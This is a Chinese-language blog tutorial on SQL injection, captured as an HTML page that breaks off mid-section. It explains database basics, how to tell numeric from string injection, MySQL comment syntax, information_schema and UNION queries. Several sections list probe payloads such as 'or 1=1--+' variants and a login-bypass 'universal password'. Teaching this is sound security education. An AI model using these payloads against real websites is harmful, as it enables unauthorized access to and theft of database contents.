<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>【SQL注入】SQL注入这一篇就够了 | TYsec</title><meta name="author" content="TYsec"><meta name="copyright" content="TYsec"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="SQL注入概念数据库基本概念 相关术语数据数据是指对客观事件进行记录并可以鉴别的符号，是对客观事物的性质、状态以及相互关系等进行记载的物理符号或这些物理符号的组合。它是可识别的、抽象的符号。 具体见百度百科 数据库数据库是“按照数据结构来组织、存储和管理数据的仓库”。是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合。  常见的数据库有：Access、MSSQL、Oracle">
<meta property="og:type" content="article">
<meta property="og:title" content="【SQL注入】SQL注入这一篇就够了">
<meta property="og:url" content="http://example.com/posts/9b311c28.html/index.html">
<meta property="og:site_name" content="TYsec">
<meta property="og:description" content="SQL注入概念数据库基本概念 相关术语数据数据是指对客观事件进行记录并可以鉴别的符号，是对客观事物的性质、状态以及相互关系等进行记载的物理符号或这些物理符号的组合。它是可识别的、抽象的符号。 具体见百度百科 数据库数据库是“按照数据结构来组织、存储和管理数据的仓库”。是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合。  常见的数据库有：Access、MSSQL、Oracle">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917143714.3oip218ppug0.png">
<meta property="article:published_time" content="2023-02-25T00:37:53.000Z">
<meta property="article:modified_time" content="2023-04-03T02:52:56.572Z">
<meta property="article:author" content="TYsec">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917143714.3oip218ppug0.png"><link rel="shortcut icon" href="https://q1.qlogo.cn/g?b=qq&nk=2142516016&s=640"><link rel="canonical" href="http://example.com/posts/9b311c28.html/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":1,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: TYsec","link":"链接: ","source":"来源: TYsec","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【SQL注入】SQL注入这一篇就够了',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-03 10:52:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=2142516016&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917143714.3oip218ppug0.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">TYsec</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【SQL注入】SQL注入这一篇就够了</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-25T00:37:53.000Z" title="发表于 2023-02-25 08:37:53">2023-02-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-03T02:52:56.572Z" title="更新于 2023-04-03 10:52:56">2023-04-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>47分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【SQL注入】SQL注入这一篇就够了"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL注入概念"><a href="#SQL注入概念" class="headerlink" title="SQL注入概念"></a>SQL注入概念</h1><h2 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h2><p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917143714.3oip218ppug0.png" alt="概念"></p>
<h3 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h3><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>数据是指对客观事件进行记录并可以鉴别的符号，是对客观事物的性质、状态以及相互关系等进行记载的物理符号或这些物理符号的组合。它是可识别的、抽象的符号。</p>
<p>具体见<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE/5947370">百度百科</a></p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>数据库是“按照数据结构来组织、存储和管理数据的仓库”。是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合。</p>
<blockquote>
<p>常见的数据库有：Access、MSSQL、Oracle、 SQLITE、 MySQL等</p>
</blockquote>
<p>具体见<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">百度百科</a></p>
<h4 id="数据库管理系统"><a href="#数据库管理系统" class="headerlink" title="数据库管理系统"></a>数据库管理系统</h4><p>数据库管理系统(Database Management System)是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，简称DBMS。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。用户通过DBMS访问数据库中的数据，数据库管理员也通过DBMS进行数据库的维护工作。它可以支持多个应用程序和用户用不同的方法在同时或不同时刻去建立，修改和询问数据库。大部分DBMS提供数据定义语言DDL（Data Definition Language）和数据操作语言DML（Data Manipulation Language），供用户定义数据库的模式结构与权限约束，实现对数据的追加、删除等操作。</p>
<p>具体见<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F">百度百科</a></p>
<h4 id="结构化查询语言"><a href="#结构化查询语言" class="headerlink" title="结构化查询语言"></a>结构化查询语言</h4><p>结构化查询语言(Structured Query Language)简称SQL，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p>
<p>具体见<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BB%93%E6%9E%84%E5%8C%96%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80">百度百科</a></p>
<h3 id="SQL语言"><a href="#SQL语言" class="headerlink" title="SQL语言"></a>SQL语言</h3><p>SQL语言包含6个部分：</p>
<ol>
<li>数据查询语言（DQL:Data Query Language）：其语句，也称为“数据检索语句”，用以从表中获得数据，确定数据怎样在应用程序给出。保留字SELECT是DQL（也是所有SQL）用得最多的动词，其他DQL常用的保留字有WHERE，ORDER BY，GROUP BY和HAVING。</li>
<li>数据操作语言（DML：Data Manipulation Language）：其语句包括动词INSERT、UPDATE和DELETE。它们分别用于添加、修改和删除。</li>
<li>事务控制语言（TCL）：它的语句能确保被DML语句影响的表的所有行及时得以更新。包括COMMIT（提交）命令、SAVEPOINT（保存点）命令、ROLLBACK（回滚）命令。</li>
<li>数据控制语言（DCL）：它的语句通过GRANT或REVOKE实现权限控制，确定单个用户和用户组对数据库对象的访问。某些RDBMS可用GRANT或REVOKE控制对表单个列的访问。</li>
<li>数据定义语言（DDL）：其语句包括动词CREATE,ALTER和DROP。在数据库中创建新表或修改、删除表（CREAT TABLE 或 DROP TABLE）；为表加入索引等。</li>
<li>指针控制语言（CCL）：它的语句，像DECLARE CURSOR，FETCH INTO和UPDATE WHERE CURRENT用于对一个或多个表单独行的操作。</li>
</ol>
<h2 id="数据库特性"><a href="#数据库特性" class="headerlink" title="数据库特性"></a>数据库特性</h2><h3 id="静态网页："><a href="#静态网页：" class="headerlink" title="静态网页："></a>静态网页：</h3><p>html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。</p>
<ol>
<li>不依赖数据库</li>
<li>灵活性差，制作、更新、维护麻烦</li>
<li>交互性交差，在功能方面有较大的限制</li>
<li>安全，不存在SQL注入漏洞</li>
</ol>
<h3 id="动态网页："><a href="#动态网页：" class="headerlink" title="动态网页："></a>动态网页：</h3><p>asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。</p>
<ol>
<li>依赖数据库</li>
<li>灵活性好，维护简便</li>
<li>交互性好，功能强大</li>
<li>存在安全风险，可能存在SQL注入漏洞</li>
</ol>
<h2 id="WEB应用工作原理"><a href="#WEB应用工作原理" class="headerlink" title="WEB应用工作原理"></a>WEB应用工作原理</h2><p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917145724.1jcqbgiegajk.png" alt="工作原理"></p>
<h2 id="SQL注入定义"><a href="#SQL注入定义" class="headerlink" title="SQL注入定义"></a>SQL注入定义</h2><p>SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<p>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
<blockquote>
<p><strong>本质</strong><br>代码与数据不区分。<br><strong>成因</strong><br>未对用户提交的参数数据进行校验或有效的过滤，直接进行SQL语句拼接，改变了原有SQL语句的语义，传入数据库解析引擎中执行。<br><strong>结果</strong><br>SQL注入</p>
</blockquote>
<h2 id="触发SQL注入"><a href="#触发SQL注入" class="headerlink" title="触发SQL注入"></a>触发SQL注入</h2><p>所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>常见的包括：</p>
<ol>
<li>Get参数触发SQL注入</li>
<li>POST参数触发SQL注入</li>
<li>Cookie触发SQL注入</li>
<li>其他参与sql执行的输入都有可能进行SQL注入</li>
</ol>
<h2 id="SQL注入过程"><a href="#SQL注入过程" class="headerlink" title="SQL注入过程"></a>SQL注入过程</h2><p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917150348.3jk2yoaamzk0.png" alt="过程"></p>
<h2 id="SQL注入场景"><a href="#SQL注入场景" class="headerlink" title="SQL注入场景"></a>SQL注入场景</h2><p>一切用户可控参数的地方，比如：URL路径、GET/POST请求参数、HTTP请求头</p>
<p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917150531.3yxg77v5mzs0.png"></p>
<h2 id="SQL注入作用"><a href="#SQL注入作用" class="headerlink" title="SQL注入作用"></a>SQL注入作用</h2><ol>
<li>绕过登录验证：使用万能密码登录网站后台等</li>
<li>获取敏感数据：获取网站管理员帐号、密码等</li>
<li>文件系统操作：列目录，读取、写入文件等</li>
<li>注册表操作：读取、写入、删除注册表等</li>
<li>执行系统命令：远程执行命令</li>
</ol>
<h1 id="注入漏洞分类"><a href="#注入漏洞分类" class="headerlink" title="注入漏洞分类"></a>注入漏洞分类</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p><strong>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/test.php?<span class="built_in">id</span>=1</span><br></pre></td></tr></table></figure>

<p>猜测SQL语句为：<code>select * from table where id=1</code></p>
<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/test.php?<span class="built_in">id</span>=1’</span><br></pre></td></tr></table></figure>

<p>SQL语句为：<code>select * from table where id=1’ </code>，页面出现异常</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/test.php?<span class="built_in">id</span>=1 and 1=1</span><br></pre></td></tr></table></figure>

<p>SQL语句为：<code>select * from table where id=1 and 1=1 </code>，页面正常</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/test.php?<span class="built_in">id</span>=1 and 1=2</span><br></pre></td></tr></table></figure>

<p>SQL语句为：<code>select * from table where id=1 and 1=2</code>，返回数据与原始请求不同</p>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p><strong>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</strong></p>
<ul>
<li>数字型：<code>select * from table where id =1</code></li>
<li>字符型：<code>select * from table where username=‘test’</code></li>
</ul>
<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码</p>
<p>测试步骤：</p>
<p>1.加<strong>单引号</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> name<span class="operator">=</span>’admin’’</span><br></pre></td></tr></table></figure>

<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
<p>2.加 **’and 1=1 **此时sql 语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> name<span class="operator">=</span>’admin’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>’ </span><br></pre></td></tr></table></figure>

<p>也无法进行注入，还需要通过注释符号将其绕过；</p>
<p>Mysql 有<strong>三种常用注释符</strong>：</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 注意，这种注释符后边有一个空格</span><br><span class="line"><span class="meta"># 通过#进行注释</span></span><br><span class="line"><span class="comment">/* */</span> 注释掉符号内的内容</span><br></pre></td></tr></table></figure>

<p>因此，构造语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> name <span class="operator">=</span>’admin’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>—’</span><br></pre></td></tr></table></figure>

<p>可成功执行返回结果正确；</p>
<p>3.加**and 1=2 -**此时sql语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> name<span class="operator">=</span>’admin’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> –’</span><br></pre></td></tr></table></figure>

<p>则会报错,如果满足以上三点，可以判断该url为字符型注入。</p>
<p><strong>注意：必须闭合字符串才可以继续注入</strong></p>
<h2 id="数据库注释语法"><a href="#数据库注释语法" class="headerlink" title="数据库注释语法"></a>数据库注释语法</h2><p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917151129.9a7bkradhfs.png"></p>
<h2 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h2><p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917151207.1p52wubbfxr4.png" alt="20200917151207"></p>
<h1 id="SQL注入基础知识"><a href="#SQL注入基础知识" class="headerlink" title="SQL注入基础知识"></a>SQL注入基础知识</h1><h2 id="MySQL基础知识"><a href="#MySQL基础知识" class="headerlink" title="MySQL基础知识"></a>MySQL基础知识</h2><p>MySQL默认的数据库有： <code>sys</code>、<code>mysql</code>、<code>performance_schema</code>、<code>information_schema</code></p>
<p><code>information_schema</code>存放着所有的数据库信息(5.0版本以上才有这个库)</p>
<p>这个库有3个表：</p>
<ul>
<li>SCHEMATA 该表存放用户创建的所有数据库库名<ul>
<li>SCHEMA_NAME 字段记录数据库库名</li>
</ul>
</li>
<li>TABLES 该表存放用户创建的所有数据库库名和表名<ul>
<li>TABLE_SCHEMA 字段记录数据库名</li>
<li>TABLE_NAME 字段记录表名</li>
</ul>
</li>
<li>COLUMNS 该表存放用户创建的所有数据库库名、表名和字段名<ul>
<li>TABLE_SCHEMA 字段记录数据库名</li>
<li>TABLE_NAME 字段记录表名</li>
<li>COLUMN_NAME 字段记录字段名</li>
</ul>
</li>
</ul>
<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p><strong>基于从服务器接收到的响应</strong></p>
<ul>
<li>基于错误的 SQL 注入</li>
<li>联合查询的类型</li>
<li>堆查询注入</li>
<li>SQL 盲注<ul>
<li>基于布尔 SQL 盲注</li>
<li>基于时间的 SQL 盲注</li>
<li>基于报错的 SQL 盲注</li>
</ul>
</li>
</ul>
<p><strong>基于如何处理输入的 SQL 查询（数据类型）</strong></p>
<ul>
<li>基于字符串</li>
<li>数字或整数为基础的</li>
</ul>
<p><strong>基于程度和顺序的注入(哪里发生了影响)</strong></p>
<ul>
<li><p>一阶注入</p>
</li>
<li><p>二阶注入</p>
</li>
</ul>
<blockquote>
<p>一阶注入是指输入的注射语句对 WEB 直接产生了影响，出现了结果；<br>二阶注入类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间 接的对 WEB 产生危害，这样的就被称为是二阶注入.</p>
</blockquote>
<p><strong>基于注入点的位置上的</strong></p>
<ul>
<li>通过用户输入的表单域的注射。</li>
<li>通过 cookie 注射。</li>
<li>通过服务器变量注射。 （基于头部信息的注射）</li>
</ul>
<h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><p>介绍几个常用函数：</p>
<ol>
<li>version()——MySQL 版本</li>
<li>user()——数据库用户名</li>
<li>database()——数据库名</li>
<li>@@datadir——数据库路径</li>
<li>@@version_compile_os——操作系统版本</li>
</ol>
<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><p>函数具体介绍 <a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5715634.html">http://www.cnblogs.com/lcamry/p/5715634.html</a></p>
<ol>
<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
</ol>
<p>说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。</p>
<h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><p>Ps:–+可以用#替换，url 提交过程中 Url 编码后的#为%23</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+ </span></span><br><span class="line"><span class="string">&#x27;or 1=1--+ </span></span><br><span class="line"><span class="string">&quot;or 1=1--+ </span></span><br><span class="line"><span class="string">)or 1=1--+ </span></span><br><span class="line"><span class="string">&#x27;</span>)<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+ </span></span><br><span class="line">&quot;) or 1=1--+ </span><br><span class="line">&quot;))<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+ </span></span><br></pre></td></tr></table></figure>

<p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>
<h2 id="UNION操作符的介绍"><a href="#UNION操作符的介绍" class="headerlink" title="UNION操作符的介绍"></a>UNION操作符的介绍</h2><p>操作符用于合并两个或多个 SELECT 语句的结果集。<br>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。</p>
<p><strong>SQL UNION 语法</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1 </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2 </span><br></pre></td></tr></table></figure>

<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<p><strong>SQL UNION ALL 语法</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1 </span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span> </span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2 </span><br></pre></td></tr></table></figure>

<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
<h2 id="SQL中的逻辑运算"><a href="#SQL中的逻辑运算" class="headerlink" title="SQL中的逻辑运算"></a>SQL中的逻辑运算</h2><p>这里说下逻辑运算的问题。</p>
<blockquote>
<p>提出一个问题 <code>Select * from users where id=1 and 1=1;</code> 这条语句为什么能够选择出 <code>id=1</code> 的内容，<code>and 1=1</code> 到底起作用了没有？</p>
</blockquote>
<p>这里就要清楚 sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> username<span class="operator">=</span>’admin’ <span class="keyword">and</span> password<span class="operator">=</span>’admin’ </span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们可以用 ’or 1=1# 作为密码输入。原因是为什么？</p>
</blockquote>
<p>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为：</p>
